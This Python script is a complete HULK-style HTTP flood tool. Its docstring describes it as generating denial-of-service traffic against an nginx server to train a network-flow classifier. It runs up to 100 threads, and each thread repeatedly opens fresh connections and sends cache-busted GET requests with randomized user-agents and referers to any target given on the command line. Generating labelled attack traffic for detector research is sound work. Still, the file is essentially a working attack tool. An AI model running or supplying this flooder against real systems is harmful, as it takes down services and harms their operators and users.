#!/usr/bin/env python3
"""HULK-style HTTP DoS flooder (dependency-free, distinct fingerprint from goldeneye).

Where goldeneye reuses each keep-alive socket for a burst of GETs, HULK opens a fresh
connection per request and sends a unique cache-busted URL with no-cache headers and a
randomized user-agent/referer every time. That produces many short single-request flows
rather than goldeneye's longer keep-alive flows, so the two tools occupy different
regions of the 56-feature space (diversity for training, and a held-out style contrast).
Application-layer flood against live nginx so every flow completes >=2 packets.

Randomizes workers per run unless pinned. Prints TOOL / START_EPOCH / END_EPOCH.
No em dashes anywhere.

Usage: hulk.py --target <ip> [--port 80] [--duration S] [--workers N] [--seed N]
"""
import argparse
import random
import socket
import string
import threading
import time

UA = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605",
    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
]
REFERERS = [
    "http://www.google.com/?q=", "http://www.bing.com/search?q=",
    "http://engadget.search.aol.com/search?q=", "http://www.usatoday.com/search/results?q=",
]


def rand(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))


def worker(host, port, stop_at, counter, lock):
    sent = 0
    while time.time() < stop_at:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            path = "/?{}={}".format(rand(6), rand(10))
            req = (
                "GET {p} HTTP/1.1\r\n"
                "Host: {h}\r\n"
                "User-Agent: {ua}\r\n"
                "Cache-Control: no-cache\r\n"
                "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                "Referer: {ref}{r}\r\n"
                "Keep-Alive: {ka}\r\n"
                "Connection: close\r\n\r\n"
            ).format(p=path, h=host, ua=random.choice(UA),
                     ref=random.choice(REFERERS), r=rand(8),
                     ka=random.randint(110, 120))
            s.sendall(req.encode())
            try:
                s.recv(256)
            except Exception:
                pass
            s.close()
            sent += 1
        except Exception:
            time.sleep(0.01)
    with lock:
        counter[0] += sent


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--duration", type=int, default=30)
    ap.add_argument("--workers", type=int, default=0, help="0 = random per run")
    ap.add_argument("--seed", type=int, default=0)
    args = ap.parse_args()

    seed = args.seed or int(time.time())
    random.seed(seed)
    workers = args.workers or random.choice([40, 60, 80, 100])
    stop_at = time.time() + args.duration
    counter = [0]
    lock = threading.Lock()

    print(f"TOOL hulk http://{args.target}:{args.port}/ duration={args.duration}s "
          f"workers={workers} seed={seed}")
    print(f"START_EPOCH {int(time.time())}")
    threads = [threading.Thread(target=worker,
                                args=(args.target, args.port, stop_at, counter, lock))
               for _ in range(workers)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f"hulk: {counter[0]} requests sent")
    print(f"END_EPOCH {int(time.time())}")


if __name__ == "__main__":
    main()
